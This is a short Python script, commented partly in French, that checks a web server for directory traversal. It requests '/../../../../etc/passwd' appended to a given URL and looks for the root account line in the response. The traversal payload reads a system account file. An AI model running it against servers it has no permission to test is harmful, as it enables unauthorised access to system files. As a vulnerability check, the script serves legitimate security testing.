import requests

def test_directory_traversal(url):
    # Directory Traversal payload
    payload = "/../../../../etc/passwd"

    try:
        response = requests.get(url + payload)
        if "root:x:0:0:" in response.text:
            print("Potential Directory Traversal vulnerability detected.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

# Remplacez 'http://yourserver.com' par l'URL de votre serveur
test_directory_traversal('http://yourserver.com')